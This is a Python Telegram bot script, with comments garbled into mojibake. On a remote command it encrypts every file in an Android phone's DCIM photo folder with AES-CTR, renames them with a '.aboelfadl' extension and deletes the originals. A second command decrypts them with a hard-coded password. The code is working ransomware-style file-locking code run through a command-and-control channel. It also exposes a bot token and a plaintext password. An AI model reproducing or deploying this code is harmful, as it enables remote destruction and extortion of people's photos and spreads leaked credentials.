import os
import sys
import telebot
import hashlib
from Crypto.Cipher import AES
from Crypto.Util import Counter

# --- Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„Ø¨ÙˆØª ---
BOT_TOKEN = "6752223055:AAE1hbI5zx2_W3miI8IbdoqT2gMSUtmDHUA" 
OWNER_ID = 1431886140
MY_PASSWORD = "mahmoud"
CHUNK_SIZE = 64 * 1024  # Ù‚Ø±Ø§Ø¡Ø© 64 ÙƒÙŠÙ„ÙˆØ¨Ø§ÙŠØª ÙÙŠ Ø§Ù„Ù…Ø±Ø© Ø§Ù„ÙˆØ§Ø­Ø¯Ø© Ù„Ù„Ø³Ø±Ø¹Ø©

bot = telebot.TeleBot(BOT_TOKEN)

# --- Ù…Ø­Ø±Ùƒ Ø§Ù„ØªØ´ÙÙŠØ± Ø§Ù„Ø³Ø±ÙŠØ¹ (AES-CTR) ---
def get_key(password):
    # ØªØ­ÙˆÙŠÙ„ Ø§Ù„Ø¨Ø§Ø³ÙˆØ±Ø¯ Ù„Ù…ÙØªØ§Ø­ 32 Ø¨Ø§ÙŠØª
    return hashlib.sha256(password.encode()).digest()

def process_file_fast(file_path, password, mode):
    try:
        key = get_key(password)
        
        # 1. Ø§Ù„ØªØ´ÙÙŠØ±
        if mode == "encrypt":
            # Ø¥Ù†Ø´Ø§Ø¡ Ø¹Ø¯Ø§Ø¯ Ø¹Ø´ÙˆØ§Ø¦ÙŠ (IV)
            iv = os.urandom(16)
            ctr = Counter.new(128, initial_value=int.from_bytes(iv, byteorder='big'))
            cipher = AES.new(key, AES.MODE_CTR, counter=ctr)
            
            output_path = file_path + ".aboelfadl"
            
            with open(file_path, 'rb') as infile, open(output_path, 'wb') as outfile:
                # ÙƒØªØ§Ø¨Ø© Ø§Ù„Ù€ IV ÙÙŠ Ø¨Ø¯Ø§ÙŠØ© Ø§Ù„Ù…Ù„Ù Ù„Ù†Ø³ØªØ®Ø¯Ù…Ù‡ Ø¹Ù†Ø¯ Ø§Ù„ÙÙƒ
                outfile.write(iv)
                
                # Ø§Ù„ØªØ´ÙÙŠØ± Ø§Ù„Ø³Ø±ÙŠØ¹ Ø¨Ø§Ù„Ù‚Ø·Ø¹ (Streaming)
                while True:
                    chunk = infile.read(CHUNK_SIZE)
                    if len(chunk) == 0: break
                    outfile.write(cipher.encrypt(chunk))
            
            os.remove(file_path) # Ø­Ø°Ù Ø§Ù„Ø£ØµÙ„ÙŠ

        # 2. ÙÙƒ Ø§Ù„ØªØ´ÙÙŠØ±
        elif mode == "decrypt":
            if not file_path.endswith(".aboelfadl"): return False
            
            output_path = file_path.replace(".aboelfadl", "")
            
            with open(file_path, 'rb') as infile, open(output_path, 'wb') as outfile:
                # Ù‚Ø±Ø§Ø¡Ø© Ø§Ù„Ù€ IV Ù…Ù† Ø¨Ø¯Ø§ÙŠØ© Ø§Ù„Ù…Ù„Ù
                iv = infile.read(16)
                ctr = Counter.new(128, initial_value=int.from_bytes(iv, byteorder='big'))
                cipher = AES.new(key, AES.MODE_CTR, counter=ctr)
                
                while True:
                    chunk = infile.read(CHUNK_SIZE)
                    if len(chunk) == 0: break
                    outfile.write(cipher.decrypt(chunk))
            
            os.remove(file_path) # Ø­Ø°Ù Ø§Ù„Ù…Ø´ÙØ±

        return True
    except Exception as e:
        print(f"Error processing {file_path}: {e}")
        return False

# --- Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ù…Ø¬Ù„Ø¯ ---
def process_folder_fast(folder_path, password, mode):
    if not os.path.exists(folder_path):
        return "âŒ Ø§Ù„Ù…Ø¬Ù„Ø¯ ØºÙŠØ± Ù…ÙˆØ¬ÙˆØ¯."
    
    count = 0
    # Ø±Ø³Ø§Ù„Ø© Ø§Ù†ØªØ¸Ø§Ø± Ù„Ø£Ù† Ø§Ù„Ø¹Ù…Ù„ÙŠØ© Ù‚Ø¯ ØªØ£Ø®Ø° Ø«ÙˆØ§Ù†ÙŠ
    bot.send_message(OWNER_ID, f"âš¡ Ø¬Ø§Ø±ÙŠ {mode} Ø§Ù„Ù…Ù„ÙØ§Øª Ø¨Ø³Ø±Ø¹Ø© Ø¹Ø§Ù„ÙŠØ©...")
    
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            file_path = os.path.join(root, file)
            
            if mode == "encrypt" and not file.endswith(".aboelfadl"):
                if process_file_fast(file_path, password, "encrypt"):
                    count += 1
            
            elif mode == "decrypt" and file.endswith(".aboelfadl"):
                if process_file_fast(file_path, password, "decrypt"):
                    count += 1
    
    return f"ğŸš€ ØªÙ… {mode} Ù„Ù€ {count} Ù…Ù„Ù Ø¨Ù†Ø¬Ø§Ø­!"

# --- Ø£ÙˆØ§Ù…Ø± Ø§Ù„Ø¨ÙˆØª ---
@bot.message_handler(commands=['secure'])
def cmd_encrypt(message):
    if message.from_user.id == OWNER_ID:
        path = "/storage/emulated/0/DCIM"
        # Ø¥Ø°Ø§ ÙƒÙ†Øª ØªØ¬Ø±Ø¨Ù‡ Ø¹Ù„Ù‰ Ø§Ù„ÙƒÙ…Ø¨ÙŠÙˆØªØ± ØºÙŠØ± Ø§Ù„Ù…Ø³Ø§Ø± Ù„Ù€ "DCIM" ÙÙ‚Ø·
        res = process_folder_fast(path, MY_PASSWORD, mode="encrypt") 
        bot.send_message(OWNER_ID, res)

@bot.message_handler(commands=['unlock'])
def cmd_decrypt(message):
    if message.from_user.id == OWNER_ID:
        path = "/storage/emulated/0/DCIM"
        res = process_folder_fast(path, MY_PASSWORD, mode="decrypt") 
        bot.send_message(OWNER_ID, res)

# Ø§Ù„ØªØ´ØºÙŠÙ„
print("ğŸš€ Turbo Bot Started with PyCryptodome...")
bot.infinity_polling()